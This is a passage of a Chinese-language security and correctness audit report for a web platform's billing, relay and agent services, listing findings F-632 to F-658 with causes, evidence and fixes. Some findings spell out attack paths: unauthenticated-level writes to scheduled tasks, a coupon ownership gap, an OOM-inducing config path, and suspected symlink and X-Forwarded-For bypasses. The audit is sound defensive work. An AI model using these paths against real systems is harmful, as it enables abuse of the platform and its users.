- 触发路径：开发者控制台订阅账单/发票列表（按 `paidAt` 归月）。
- 根因：`paidAt` 为 timestamptz，`toISOString()` 输出 UTC，每月 1 日 00:00–08:00（北京）落入上月。
- 证据：`:910` `period: (o.paidAt ?? o.createdAt).toISOString().slice(0, 7)`。
- 影响面：账单/发票归属月错误（每月 1 日早 8 小时窗口），跨月对账与开票差异。
- 建议修法：`bizDayKey(paidAt).slice(0,7)`。
- 是否当场可修：是。

#### F-632 积分消耗日历用 UTC 日，签到已改上海日，口径注释失效
- 严重度：P3
- 文件与行号：`services/credits-usage-service.ts:6,54,59,138`；对照 `utils/checkin-helpers.ts:25-30`
- 触发路径：用户查看“积分消耗热力图/今日消耗”。
- 根因：文件头仍声明与 `todayString/shiftDate` 同一 UTC 约定，但 `todayString` 已改为 `bizDayKey()`（上海），分桶仍 `AT TIME ZONE 'UTC'`。
- 证据：`:6` 注释 UTC 约定；`:59/:138` `to_char(created_at AT TIME ZONE 'UTC','YYYY-MM-DD')`；`checkin-helpers.ts:26` `return bizDayKey()`。
- 影响面：北京时间 00:00–08:00 消耗被记到前一天，用户看到“今日消耗=0”，热力图与签到日历错位。
- 建议修法：改 `AT TIME ZONE 'Asia/Shanghai'` + `bizDayKey()`，同步修注释。
- 是否当场可修：是。

#### F-633 充值赠送先按整“元”取整再折分，带角分充值多/少送
- 严重度：P3
- 文件与行号：`services/topup-discount-service.ts:133`；调用 `services/order-service.ts:184-186`
- 触发路径：自定义金额充值输入非整元（如 100.50）。
- 根因：`Math.round(amount * multiplier)` 先把到账额取整到元，再用 `(actualCredit - amount) * 100` 算赠送，取整残差被当成赠送。
- 证据：`:133` `const actualCredit = Math.round(amount * matched.multiplier) + matched.bonus`；`order-service.ts:184-186` 再按元差折分。
- 影响面：默认阶 1.2/20 下 100.5 → 实到 141（应 140.6），多送 40 分；乘数=1 时 100.5→101 凭空送 50 分。每笔 ±0.5 元尾差。
- 建议修法：全程用分计算 `actualCreditCents = Math.round(amountCents * multiplier) + bonus*100`。
- 是否当场可修：是。

#### F-634 定价建议聚合先把平均单次收入截成整数分，低价模型永远“无有效收入”
- 严重度：P3
- 文件与行号：`services/price-history-service.ts:236`；阈值 `:265`；输出 `:286-287`
- 触发路径：管理员查看“定价建议”（近 7 天按模型聚合）。
- 根因：`avg(cost_cents)::numeric::int` 在算 `marginRate` 前就四舍五入到整分；`avg<0.5 分` 的模型 revenue 变 0，走“无有效收入”分支。
- 证据：`:236` `avgRevenueCents: sql\`coalesce(avg(cost_cents),0)::numeric::int\``；`:265` `if (revenue <= 0) reason = '近 7 天无有效收入数据,维持当前倍率'`。
- 影响面：低价/薄利模型永远拿不到提价/降价建议，毛利优化只覆盖高价模型。
- 建议修法：聚合保留精度，只在输出时 round；`revenue<=0` 前先判 `avg IS NULL`。
- 是否当场可修：是。

#### F-635 下单金额 `Math.round(x*100)` 与网关 `toFixed(2)` 半美分不一致
- 严重度：P3
- 文件与行号：`routes/user/fund-routes.ts:49,64`（支付宝）、`:101,116`（微信）
- 触发路径：`/fund/ali/pay/create`、`/fund/wx/pay/create`，`body.amount` 带 3 位以上小数（校验只查有限/正/上限）。
- 根因：订单按 `Math.round(amount*100)` 取分，网关按 `amount.toFixed(2)` 取字符串，`.5 分` 与浮点边界结果不同。
- 证据：`:49` `amount: Math.round(body.amount * 100)`；`:64` `total_amount: body.amount.toFixed(2)`。`0.015 → 2 分 vs "0.01"`。
- 影响面：本地 2 分、网关实收 1 分，回调金额校验不符导致订单不置成功；若放宽校验则 1 分买到 2 分额度。
- 建议修法：入口统一 `amountCents`，网关用 `(amountCents/100).toFixed(2)`；或校验最多两位小数。
- 是否当场可修：是。

### 第二十轮未判定（证据不足，不计入结论）

1. **`agent-team-service.ts:302-317` handoff 的 symlink 穿越**：`resolve + relative` 不解析符号链接，artifactRoot 内 symlink 可读根外文件；缺“agent 是否能在 artifactRoot 下创建 symlink”的证据。
2. **`tiered-pricing-service.ts:157` `like(model, '%/${dbModelId}')` 未转义 `_`/`%`**：模型 id 含下划线时会跨模型命中；仓库内置目录未检出含 `_` 的 id，缺生产模型目录证据。
3. **`apiSubscription` 窗口额度 check-then-consume**：请求前判、结算后 consume，并发可超发；缺 relay 链是否存在 `preDeductQuota` 预留的证据。
4. **`edu-ledger` 退费归属**：多报名同班下 `enrollmentId IS NULL` 但 `paymentId` 属本报名 的历史退费会被漏加；缺“能产生 enrollmentId 为空退费”的写入路径。
5. **`private-letters-admin-queries.ts:49` 用裸 `sql\`users u2\`` 作 join 源**：本机无依赖，无法确认 drizzle-orm 是否接受；需 `node_modules` 下验证。
6. **`workflow-queries.ts:80,184,346` 未转型 `COUNT(*)`**：postgres.js 下 int8 可能字符串返回，取决于驱动解析与 response schema，无法本机证实。
7. **`/metrics` 的 XFF 绕过**：依赖 EdgeOne/Next 是否覆写 `X-Forwarded-For`；本环境无法验证。
8. **`upload-scanner` 是否真正覆盖 `/api/oss/upload`**：若走 OSS 预签名直传则扫描只是装饰；需读该路由确认是否本服务代理上传。
9. **`relay-ops-snapshot.ts:134/158` 的 `(metadata->>'costCents')::numeric`**：历史非数字值会抛错并被段级容错吞掉；取决于写入端保证。
10. **`coupon-service.ts:400-415` 的 `coupon.value` 单位**：代码按“分”用于满减，若后台按“元”录入则少减 99%；schema `numeric(5,2)` 未标单位。
11. **`agent-chat-queries.ts` 序列号从 0 起**：后端语义正确，但前端/网关若以 falsy 判断 `cursor` 会丢第一页；缺前端证据。
12. **`ai_config/system_configs` 百分比单位（5 vs 0.05）**：`parseNumber` 若被后台以百分数录入会造成 100 倍偏差；缺前端表单证据。

### 第二十轮覆盖（五路并行）

- A 路 业务核心：`order-service`（92-200/238-312/300-460/555-680）、`edu-ledger`（40-200/430-700）、`edu-arrear-remind-service`（290-500）、`edu-attendance-absent-job`（58-140/150-330/380-600/614-680）、`edu-schedule-conflict`、`edu-attendance-rule`、`agent-service`、`agent-task-status`、`agent-team-service`、`agent-event-trigger`、`agent-sse-bus`、`credits-usage-service`、`plan-entitlement-service`、`user-billing-group-service`、`subscription-window-service`、`subscription-service`、`api-subscription-service`、`points-service`、`srs-review-service`、`spaced-repetition`、`reconciliation-service`、`settlement-service`、`redemption-code-service`、`stock-service`、`tool-invocation-ledger-service`、`distributed-transaction`、`token-service`、`api-key-tpm-service`、`user-concurrency-service`、`pricing-engine`、`tiered-pricing-service`、`ai-cost-tracker`、`plugins/ai-cost`（预算段）。
- B 路 db 逐行：零命中 20 个全文精读（`agent-queries`/`agent-chat-queries`/`agent-team-queries`/`ai-feed-post-queries`/`captcha-queries`/`chat-collab-queries`/`id-mapping-queries`/`mcp-queries`/`mobile-stats-queries`/`oauth-token-queries`/`openclaw-queries`/`private-letters-admin-queries`/`resource-likes-queries`/`security-logs-queries`/`sensitive-words-queries`/`statistics-queries`(453 行)/`topic-queries`/`voice-note-queries`/`workflow-queries`/`workspace-permission-queries`），另补读 12 个用于排重取证。
- C 路 plugins：24 个精读（`api-logger`/`api-logger-extended`/`log-sanitizer`/`api-versioning`/`trace`/`otel`/`compression`/`search-aspect`/`anomaly-detector-plugin`/`resilience-extended`/`resilience-toolkit`/`slow-sql-killer`/`threat-detector`/`csrf`/`network-segment`/`tenant-db-isolation`/`internal-secret-auth`/`internal-service-ticket`/`public-paths`/`lazy-admin-guard`/`upload-scanner`/`sqli-guard`/`mtls`/`cors-origin`），并联动 `anomaly-detector`/`ip-reputation`/`misc-extended-queries`/`workspace-ai`/`search`/`auth-cookies`/`server`。
- D 路 relay 家族：精读 30 个（`relay-outbound-proxy`/`relay-model-catalog`/`relay-proxy-pool`/`relay-error-rules-service`/`relay-live-probe`/`relay-prompt-audit-service`/`relay-account-shared-state`/`relay-ops-snapshot`/`relay-alert-rules-service`/`relay-task-center`/`relay-account-usage`/`relay-stop-truncate`/`relay-local-login`/`relay-plugins-service`/`relay-upstream-adapters`/`relay-user-attributes-service`/`key-rate-window-service`/`user-concurrency-service`/`relay-pool-policy`/`relay-account-pool-reconcile`/`relay-account-pool-credential`/`relay-account-pool-reauth`/`vendor-auth-strategies`/`vendor-caller-service`/`vendor-error-handler`/`model-mapping-service`/`relay-upstream-forwarder`/`relay-channel-router`），交叉阅读 `v1-public`/`api-key-auth`/`relay-billing-service`/`ws-relay-ops`。
- E 路 金额/时区：全仓 Grep `::int`/`::integer`/`real`/`float4`/`float8`/`numeric(`/`toFixed`/`Math.round|floor|ceil`/`* 100`/`/ 100`/`parseFloat|parseInt` 与 `setMonth|setDate|setFullYear`/`new Date(`/`toISOString`/`slice(0,10|7)`/`getMonth|getDate|getHours`/`bizDayKey`/`Asia/Shanghai`/`AT TIME ZONE`/`to_char(`/`+ interval '8 hours'`，落库列类型回溯 `schema/*.ts`。
- 本轮主代理复核：F-580/F-581（`order-service.ts:164,660-667,567-569` + `payment-recurring.ts:683-691`）、F-592（`statistics.ts:84-87,659-665` + `statistics-queries.ts:441`）、F-593（`agents-queries.ts:66-69` + `agentic-service.ts:39-44` + `checkAuth`）、F-605（`anomaly-detector-plugin.ts:87` + `anomaly-detector.ts:153-168,202-204,280-316,424`）、F-607/F-608（`resilience-extended.ts:49-63,76-78` + Grep 确认 3 处调用方）、F-616（`forwarder:358` + `v1-public.ts` 仅 3 处 `signal:` 均在流式）、F-617（`forwarder:379-383` + `router:44,345-353`）、F-619（`shared-state.ts:302,353`）、F-621（`proxy-pool.ts:170-180`）、F-623（`prompt-audit:44,145-146`）、F-628（`relay-billing:1191,1217` + `relay-logs:464`）、F-629（`order-service:165,188,662`）、F-632（`credits-usage:6,59` + `checkin-helpers:26`）。

### 第二十轮已有覆盖（本轮去重排除，不重复报）

- **F-165**：`/admin/relay/capacity/call-trend` 查询不存在的 `cost_used_total_cents`（本轮 E2 同项）。
- **F-577**：`payment-recurring.ts:87-92` 与 `subscription-service.ts:337` 的 `setMonth` 月末溢出（本轮 E3 同项，已含 subscription-service）。
- **F-240**：全局在途闸 `INCR` 成功但 `PEXPIRE` 失败的无 TTL 键（本轮 D4 同项）。
- **F-237**：错误透传未命中规则时回上游原文（本轮 D9 同项）。
- **`relay-alert-rules-service.ts:462-468` 冷却读副本/无跨实例互斥**：已在第十七轮告警条目覆盖（本轮 D10 同项）。
- **F-123**：`search-aspect` 热词“先查后插 + 无唯一约束”导致的重复行（本轮 C5 的重复行维度不重报，仅保留 F-609 的排序/过滤维度）。
- **F-573**：`metadata->>'costCents'` 的 `::int` 截断；本轮 F-628 补充“写侧已迁顶层列导致恒 0”这一更前置根因。
- **F-493**：`forwardToChannel` 无超时；本轮 F-616 为其 chat 非流式新出口。
- **F-226**：`ws-relay-ops` 的 error/close 双重 release；本轮 F-624 为无节流/无单飞维度。
- **F-572**：分页缺唯一 tiebreaker；本轮 F-600 为 db 层新出口清单。

<!--ROUND20_E_DONE-->

---

## 二十五、第二十一轮（五路并行）

> 基线复核：`HEAD == origin/main == 89a5938f0c`；`apps/api` 工作树仍为 5 个文件差异（`routes/index.ts`、`routes/mcp-extended.ts`、`services/email-templates.ts`、`tests/email-templates.test.ts`、删除 `routes/__tests__/d141-control-frame-proxies-v2.test.ts`），涉及文件按 `git show HEAD:<path>` 读基线。本轮 44 条全部实读取证；5 条 P1（F-636/F-646/F-660/F-670/F-671）由主代理逐行复核。

### 第二十一轮 A 路：db 查询层剩余逐行

#### F-636 `/api/schedule` 写端点仅挂在 checkAuth 插件，任意登录用户可增删改平台定时任务
- 严重度：P1
- 文件与行号：`routes/schedule.ts:76-79`（唯一守卫 `checkAuth`）、`:219-226`（POST）、`:229-243`（PUT）、`:246-253`（DELETE）、`:255-266`（complete）；`routes/index.ts`（HEAD）`:681`；`db/schedule-queries.ts:23,65,99,124`
- 触发路径：任意普通登录用户 `POST/PUT/DELETE /api/schedule[/:id]`、`POST /api/schedule/:id/complete`。
- 根因：文件注释（`:72-74`）声明该前缀「需登录，只读」，实际同一插件内挂了四个写端点；同文件 `:273` 起的 `adminScheduleRoutes` 另有 `requireAdmin` 版本，说明写能力本应只在管理端。`schedule_tasks` 无归属列，db 层函数也无 actor 参数。
- 证据：`:77-79` preHandler 仅 `await checkAuth(...)`；`:224` `await createScheduleTask(parsed.data)`；`:251` `await deleteScheduleTask(parsed.data.id)`。
- 影响面：可清空/篡改全站定时任务配置（cron、targetService/targetMethod、parameters）、伪造 lastRunStatus、读取全部任务与执行日志（parameters 可能含密钥）。当前调度器只遍历代码内 `SCHEDULED_JOBS`，不消费 DB 任务字段，故暂不构成 RCE；一旦接线即为任务注入。
- 建议修法：写端点与 complete 移入 `adminScheduleRoutes` 或加 `requireAdmin`，公共插件只保留 GET。
- 是否当场可修：是。

#### F-637 教育公告列表按随机 UUID 排序，`sort`/`publishTime` 全部失效且未到发布时间即公开
- 严重度：P2
- 文件与行号：`db/message-queries.ts:32-33,44,67-68,80-81`；`packages/database/src/schema/message.ts:27,32,33`
- 触发路径：`GET /api/messages/announcements`（`publishedOnly=true`）与后台公告列表；后台设置 `sort` 或未来 `publishTime`。
- 根因：`orderBy(desc(isTop), desc(id))`，而 `edu_announcements.id` 是 `uuid defaultRandom()`；`sort`、`publish_time` 既不排序也不过滤。
- 证据：`:44` `.orderBy(desc(eduAnnouncements.isTop), desc(eduAnnouncements.id))`；`:32-33` 只加 `isPublished/status`；schema `id: uuid(...).defaultRandom()`。
- 影响面：非置顶公告每次刷新顺序不同、后台排序无效；定时公告在 publishTime 前即对外可见（提前泄露）。
- 建议修法：where 补 `lte(publishTime, now)`（兼容 null），orderBy 改 `desc(isTop), asc(sort), desc(publishTime), desc(id)`。
- 是否当场可修：是。

#### F-638 `edu_settings` 无 (group,key) 唯一约束且批量导入不回写快照，同批重复 key 产生重复配置
- 严重度：P2
- 文件与行号：`db/setting-queries.ts:280-308`（`:300-306` 循环内 insert 不回写 map）、`:100-109`（`limit(1)` 无 ORDER BY）；`schema/setting.ts:44`（普通 index）
- 触发路径：`POST /api/admin/edu-settings/import`（`routes/setting.ts:386-393`，上限 500 条，未校验 (group,key) 去重）提交重复项；或并发创建。
- 根因：应用层 check-then-act，DB 无唯一键兜底；批量导入只在循环前取一次 existingMap。
- 证据：`:300-306` `const existing = existingMap.get(...); if (existing) {...} else { await createEduSetting(...) }`（无 `existingMap.set`）；`schema:44` `index('edu_settings_group_key_idx')`。
- 影响面：公开配置同一 key 多条、`findEduSettingByGroupKey` 随机取一条 → 站点配置/支付参数漂移；delete 只能删一条。
- 建议修法：迁移加 UNIQUE(group,key)；`onConflictDoUpdate`；循环内回写 map；查询加 orderBy(desc(updatedAt))。
- 是否当场可修：代码可改，唯一索引需迁移。

#### F-639 群发通知全表无状态过滤 + 单条超大 INSERT，用户量过万整批 500
- 严重度：P2
- 文件与行号：`db/notification-queries.ts:343-363`；`routes/notifications.ts:450-463`
- 触发路径：管理端 `POST /api/admin/notifications/broadcast`；Redis/队列不可用或 `addBulk` 抛错时走同步直写分支。
- 根因：`select({id}).from(users)` 无任何状态过滤（含已注销 status=3），随后一次性 `insert(notifications).values(allUsers.map(...))`；降级分支无条件再跑一次全量同步写。
- 证据：`:348` 全表选 id；`:351-361` 单条大 insert；`notifications.ts:456-459` catch 内再次 `broadcastNotification`。
- 影响面：约 1.6 万用户（4 参数/行）即触发 PG 65535 参数上限，整批失败一条不发；持续向注销账号投递；同步分支占住事件循环。
- 建议修法：where 排除 status=3；按 1000 行分片；降级分支加幂等键避免重复补发。
- 是否当场可修：是。

#### F-640 OSS 默认驱动“先清空再写入”无事务，失败后全站无可默认驱动
- 严重度：P2
- 文件与行号：`db/oss-queries.ts:104-124`（create 先 `clearOtherDefaults()` 再 insert）、`:138-155`（update 同型）、`:79-86`（`limit(1)` 无排序）、`:163-170`
- 触发路径：管理端创建/更新驱动并勾选 `isDefault=true`，随后 insert 因 name 唯一冲突/加密失败/DB 抖动抛错。
- 根因：两条语句无事务，表上也无“仅一条 isDefault”的部分唯一索引；并发创建可留下两条默认。
- 证据：`:105-106` `if (input.isDefault) await clearOtherDefaults()`；`:83-84` `where(isDefault && isEnabled).limit(1)`。
- 影响面：默认被清空且新行未写入 → `findDefaultOssDriver()` 返回 undefined，全部业务上传失败；两条默认时随机取一条，文件落到意外 bucket。
- 建议修法：clear+insert/update 放 `db.transaction`；加部分唯一索引；查询补 orderBy。
- 是否当场可修：代码可改，索引需迁移。

#### F-641 删除菜单只删自身，子菜单成悬空孤儿且无法再从后台删除
- 严重度：P2
- 文件与行号：`db/admin-sys-queries.ts:166-172`；`routes/admin-sys/menu-routes.ts:116-124`；`schema/admin-sys.ts:27`（parentId 无 FK）
- 触发路径：管理员 `DELETE /api/admin/sys-menu/:menuId` 删除仍有子节点的父菜单。
- 根因：事务只删目标行与该行 role_menu，未递归删 `parent_id = id` 的子节点；parent_id 无外键，DB 不报错不级联。
- 证据：`:168-169` 仅 `delete(sysRoleMenu).where(menuId=id)` + `delete(sysMenus).where(id=id)`；schema `parentId: uuid('parent_id')`。
- 影响面：子树从树上消失但数据残留，后台再也无法选中/删除；子菜单授权行残留，越删越脏。
- 建议修法：删除前检查子节点并拒绝，或递归 CTE 级联删除；补自引用 FK。
- 是否当场可修：是。

#### F-642 admin-sys 分页参数零校验，负值/超大值直达 LIMIT/OFFSET
- 严重度：P3
- 文件与行号：`db/admin-sys-queries.ts:49-53`；`routes/admin-sys/_shared.ts:8-12`；调用示例 `routes/admin-sys/logininfor-routes.ts:19-21`
- 触发路径：`GET /api/admin/logininfor/list?pageSize=-1`、`?pageSize=100000000`、`?page=1.5`。
- 根因：`paginate` 直接使用 `query.page/pageSize` 计算 offset/limit；`parseNum` 只做 Number 转换，无取整/夹取。
- 证据：`:50-52` `offset: (page - 1) * pageSize`；`_shared.ts:10-11` `Number(v)` 后仅判 NaN。
- 影响面：负 limit → PG 报错 500；超大 pageSize → 全表拉取内存尖峰；小数 page → 非法 OFFSET。仅管理端可达故 P3。
- 建议修法：`Math.max(1, Math.trunc(page))`、`Math.min(100, Math.max(1, Math.trunc(pageSize)))`。
- 是否当场可修：是。

#### F-643 registry 同步的存在性/版本判定读只读副本，副本延迟时 inserted/skipped/oldVersion 失真
- 严重度：P3
- 文件与行号：`db/registry-queries.ts:234-246`、`:358-368`、`:386-402`
- 触发路径：注册表单条/批量同步在副本延迟窗口内执行。
- 根因：判定读 `dbRead`、写入走主库 `db`，决策与写入不同数据源不同事务。
- 证据：`:234` `dbRead.select(...)`；`:245-246` `inserted = existing.length === 0`、`oldVersion = existing[0]?.version ?? null`。
- 影响面：同步日志 inserted 虚高/old_version 为 null，审计链断档；或误判 skipped 导致主库停留旧版本。
- 建议修法：该路径读主库，或改 `onConflictDoUpdate ... returning(xmax = 0)` 单语句判定。
- 是否当场可修：是。

#### F-644 `runScheduleTaskNow` 两次写库无事务，日志失败时任务已被标记已运行
- 严重度：P3
- 文件与行号：`db/schedule-queries.ts:152-182`
- 触发路径：`POST /api/schedule/:id/complete` 或管理端手动触发，`schedule_logs` 插入失败（并发删除触发 FK/DB 抖动）。
- 根因：先 UPDATE 任务状态，再单独 INSERT 日志，无事务；`:180` 在两次写之后才判 `!log` 并返回 undefined。
- 证据：`:159-168` update；`:169-178` insert；`:180` `if (!updated || !log) return undefined`。
- 影响面：接口 500 但任务已变“已运行”，状态与日志永久对不上；`!log` 让路由回 404 而任务其实已被修改。
- 建议修法：事务包裹；补 enabled 校验；删除“已写库后返回不存在”的分支。
- 是否当场可修：是。

#### F-645 `acceptInvitation` 先加成员后改邀请状态，非事务且终态守卫被显式豁免
- 严重度：P3
- 文件与行号：`db/team-queries.ts:338-360`
- 触发路径：并发“接受 + 拒绝/撤销”，或第二步 UPDATE 失败。
- 根因：成员插入与邀请更新两条独立语句；UPDATE 只有 id 条件（`status-guard-exempt`），路由层 pending 校验与写库之间存在 TOCTOU。
- 证据：`:346-351` insert teamMembers；`:355-357` `set({status:'accepted'})` + `// status-guard-exempt` + `where(eq(id))`。
- 影响面：邀请已被撤销仍能加成员；成员已存在而邀请仍 pending，权限审计失真。
- 建议修法：事务内先 `UPDATE ... WHERE id=? AND status='pending' AND expires_at>now() RETURNING`，命中后再插成员。
- 是否当场可修：是。

### 第二十一轮 B 路：services 剩余逐行

#### F-646 审计证据导出按 timestamp DESC 分页：链锚恒不生成，导出期间新写入还会静默跳行
- 严重度：P1
- 文件与行号：`services/siem-exporter.ts:200-220,613-625,642-662`；`db/audit-queries.ts:169-175`；`routes/audit-evidence-export.ts:211-231`
- 触发路径：管理员 `POST /api/admin/audit/evidence/export` → `buildSignedAuditExport` → `streamExportRows` 逐页 `selectAuditLogs`。
- 根因：导出复用管理台 UI 的 `ORDER BY timestamp DESC` 查询，而 `buildChainAnchor` 要求行按链方向（旧→新）连续；DESC 上做 OFFSET 分页，导出期间有新审计写入时后续页整体下移。
- 证据：`audit-queries.ts:173` `ORDER BY timestamp DESC LIMIT ? OFFSET ?`；`siem-exporter.ts:618-619` `if (rows[i]?.prevHash !== rows[i-1]?.currentHash) return undefined`；`:661` 有锚才挂。
- 影响面：任意 ≥2 行的导出都拿不到 chainAnchor，收件方无法证明导出区间在链上连续；签名只覆盖 filters+lines，删行后信封仍验签通过（86F 链锚实质关闭）；并发出入导致漏行而 rowCount 仍自洽。
- 建议修法：导出专用查询改 `ORDER BY timestamp ASC, id ASC` + keyset 分页；UI 保持 DESC。
- 是否当场可修：是。

#### F-647 手工“临时摘除”的账号会被巡检在 5 分钟内自动撤销
- 严重度：P2
- 文件与行号：`services/relay-account-pool-scheduler.ts:618-628,700-716,1035`；`routes/admin/relay-account-pool.ts:289`
- 触发路径：管理员 PATCH `tempUnschedulable:true` → 下一轮 `sweepAccountPool()` 步骤 3 选中 → `refreshOne()` 换票成功 → 写 `tempUnschedulable:false`。
- 根因：`tempUnschedulable` 同时承载自动/人工摘除，无来源标记；`downRecoveryWhere()` 刻意不看该列，人工摘除的号 refreshFailureCount 通常为 0，兜底条件不成立。
- 证据：`:623-627` where 只判 enabled/healthStatus/recredentialable；`:709-710` 成功即 `tempUnschedulable:false`；`:618-619` 注释自述“刻意不看”。
- 影响面：人工止血失效，问题号继续承接流量且无日志。
- 建议修法：加 `unschedulableSource`，只清自动摘除；或人工摘除统一走 `isEnabled=false`。
- 是否当场可修：是。

#### F-648 自动化修复任务 `claimed/running` 无租约无回收，进程中断即永久卡死
- 严重度：P2
- 文件与行号：`services/automation-repair-service.ts:137-147,503-533,717-744`
- 触发路径：定时器 → `runCycle()` → `claim()` 置 claimed → 释放互斥锁 → `executeClaimed()` 置 running 并执行长任务；执行器 OOM/重启。
- 根因：状态机对 claimed/running 一律不可领，`claimed→pending` 回退无调用点，全文件无 lease/heartbeat/超时回收。
- 证据：`:137-147` `{claimable:false, reason:'in_progress'}`；`:504-506` 注释要求 claim 内迁走状态，但解锁先于执行。
- 影响面：任务永久停在 claimed/running，每轮扫描跳过，该 issue 的自动修复从此静默失效。
- 建议修法：落 leaseUntil/heartbeatAt，runCycle 开头回收超租约任务。
- 是否当场可修：是。

#### F-649 修复任务状态用“进程内文件快照 + 跨实例互斥锁”，多实例互相覆盖/重复修复
- 严重度：P2
- 文件与行号：`services/automation-repair-service.ts:219-230,647-650,717-744`
- 触发路径：多副本部署，每个进程都跑 `startRepairCycleScheduler()`。
- 根因：锁粒度是任务 key（Redis 分布式锁），状态权威却是每进程各一份 JSON 文件快照（启动加载一次，每次整文件覆盖）。
- 证据：`:219-230` 文件落盘 + 一次性 `ensureLoaded`；`:647-650` `createDistributedClaimMutex`；每次迁移整份 `persist()`。
- 影响面：B 进程快照仍为 pending → 重复开 PR/评论；A 的完成状态被 B 整文件覆盖丢失。单实例不触发。
- 建议修法：任务表/Redis Hash 为唯一权威，锁只做执行互斥；或显式 leader 选主。
- 是否当场可修：需改造。

#### F-650 代码索引“先删旧切片后插新切片”无事务，插入失败即整文件索引丢失
- 严重度：P2
- 文件与行号：`services/codebase-index-service.ts:184-196,216-221,247-254`；`routes/v1-codebase-search.ts:205-209`
- 触发路径：`POST /api/v1/codebase/index`（单批最多 1000 chunk）→ 按 filePath 逐条 DELETE → embedding（异常被吞）→ 分批 INSERT。
- 根因：删除先于任何写入成功，且删/插不在同一事务，无版本列可回退。
- 证据：`:187-195` 逐 filePath delete；`:252` `insert(codebaseChunks).values(batch)` 无 try/回滚。
- 影响面：任一插入批次失败 → 旧切片已删、新切片未写，检索查不到该文件内容，用户只见 500。
- 建议修法：删旧+插新同事务；或版本列先插后切。
- 是否当场可修：是。

#### F-651 `param-ops` 的 `setPath` 对数组下标无上界，一条配置可让每个命中请求 OOM
- 严重度：P2
- 文件与行号：`services/relay-param-ops.ts:281,298`；校验 `relay-param-ops-config.ts:296-320`；热路径 `routes/v1-public.ts:770`、`v1-messages.ts:497`、`v1-responses.ts:549`
- 触发路径：管理员配置 `{op:'set', path:'messages.999999999', value:'x'}` → 每个中转请求深拷贝后 `setPath` 逐格补位。
- 根因：路径段只校验“是数字”，无上限；运行时 `while (container.length <= idx) container.push(null)`。
- 证据：`:281` 补位循环；`:298` 直接赋值；`validateParamOps` 无下标/段数/op 数上限。
- 影响面：1e8 级下标瞬间分配数百 MB，1e9 直接 OOM；配置对所有命中该渠道的请求生效，等于一次配置错误打挂全实例。
- 建议修法：校验与运行时限制下标 ≤1000、段数 ≤32、op 数上限。
- 是否当场可修：是。

#### F-652 算法备案同步无 fetch 超时、无 in-flight 守卫，定时器可叠加多轮
- 严重度：P2
- 文件与行号：`services/algorithm-record-service.ts:37-53,333-341`；启动 `index.ts:350`
- 触发路径：每 6h `setInterval(() => syncAlgorithmRecords().catch(...))`，串行拉取发现页+多批次+多分页附件。
- 根因：fetch 无 signal（只吃 undici 默认 300s），页数/批次无总量与总时长上限，定时器不等待上一轮完成。
- 证据：`:38-41` `fetch(url, { headers, redirect })` 无 signal；`:337-339` setInterval 直接调用。
- 影响面：单轮可跑数十分钟至数小时，超 6h 后并发叠加，重复下载/upsert、内存翻倍。
- 建议修法：`AbortSignal.timeout(20_000)`；限制页数/批次；加 running 单飞。
- 是否当场可修：是。

#### F-653 巡检阶段 2 把“检查异常 + 落库失败”静默吞掉，`healthChecked` 仍已自增
- 严重度：P2
- 文件与行号：`services/relay-account-pool-scheduler.ts:1009-1031`
- 触发路径：`sweepAccountPool()` 步骤 2，对每个账号 `adapter.checkHealth()` 与 `db.update(...)` 包在同一 try。
- 根因：catch 无日志/计数；`out.healthChecked++` 早于 DB 更新。
- 证据：`:1029-1031` `catch { /* 单账号检查异常不中断整轮 */ }`；`:1014` 自增，`:1016-1028` 才 update。
- 影响面：适配器/代理/DB 失败一律无痕，面板显示已检查 N 个而状态从未落库，账号长期 unknown（与文件内 1001-1003 行记录的旧事故同形复发）。
- 建议修法：catch 记 warn + healthFailed；自增移到落库成功后。
- 是否当场可修：是。

#### F-654 永久保活号“自动解摘”写库失败仍上报已解摘 N 个
- 严重度：P3
- 文件与行号：`services/relay-account-pool-scheduler.ts:355-372,920-931`
- 触发路径：`runSweepOnce()` → `reviveKeepAliveForeverAccounts()` 逐行 `update(...).catch(() => {})` → 调用方按返回数组打日志。
- 根因：把查询到的候选行当成功行返回，写失败被吞。
- 证据：`:369-372` `...catch(() => {})` 紧接 `return stale`；`:926-930` 以 `revived.length` 记“已解摘”。
- 影响面：DB 抖动时日志谎报成功，账号实际仍被摘，后续每轮重复失败无告警。
- 建议修法：逐行 await 成功才计数，失败记 errors。
- 是否当场可修：是。

#### F-655 优惠券改价接口对“无主订单”缺归属校验，与支付接口口径不一致
- 严重度：P3
- 文件与行号：`routes/miniapp-pay-routes.ts:164-173`；`schema/billing.ts:84`
- 触发路径：`POST /api/miniapp/pay/apply-coupon`（orderNo + userCouponId）对 `order.userId === null` 的订单跳过归属校验。
- 根因：`if (order.userId && order.userId !== userId)` 把“归属未知”当放行；`orders.user_id` 是 `onDelete:'set null'`，注销用户订单即无主。
- 证据：`:168-170` 条件判断；schema `:84` `references(users.id, { onDelete:'set null' })`。
- 影响面：可改无主待支付订单金额、核销/退还其上优惠券；与支付接口严格 `!==` 口径不一致。
- 建议修法：改为 `if (!order.userId || order.userId !== userId) 403`。
- 是否当场可修：是。

#### F-656 低余额邮件“先写冷却再发送”，一次 SMTP 失败静默 24h；环境变量非法时反向失效
- 严重度：P3
- 文件与行号：`services/mail-relay-notifier.ts:33-41,160-171,215-223`
- 触发路径：扣费后 `checkAndNotifyLowBalance` → 判低 → 先写 `lastNotifiedAtByUser` → 再发送。
- 根因：去重键在发送前落且不回滚；`Number(process.env...)` 无校验。
- 证据：`:216` 先 set 后 send；`:37-38` 直接 Number。
- 影响面：SMTP 失败则该用户 24h 收不到提醒；COOLDOWN 非数字时每次扣费都发（邮件风暴）；阈值非数字时告警永久失效。
- 建议修法：发送成功后再写冷却；`Number.isFinite` 校验回退默认。
- 是否当场可修：是。

#### F-657 `canary-service` 的 `initPromise` 失败后永久 rejected，进程内金丝雀功能全挂
- 严重度：P3
- 文件与行号：`services/canary-service.ts:67-106`
- 触发路径：任意金丝雀调用 → `ensureTables()` 首次 DDL 因 DB 抖动失败。
- 根因：`initPromise` 只赋值不清理，无 catch 复位；后续 `return initPromise` 恒 rejected。
- 证据：`:70-71` 惰性赋值；`:105` `return initPromise`，全函数无 catch/重置。
- 影响面：一次性 DB 故障后直到进程重启，阶段配置读写与自动回滚审计全部以旧错误失败（安全阀不可自愈）。
- 建议修法：`initPromise = p.catch(e => { initPromise = null; throw e })`。
- 是否当场可修：是。

#### F-658 Qoder 桥接把访问密钥放进子进程 argv
- 严重度：P3
- 文件与行号：`services/qoder-bridge-client.ts:18,138-145`
- 触发路径：首次调用 `ensureQoderBridge()` → `spawn(execPath, [script, '--key', key, ...])`。
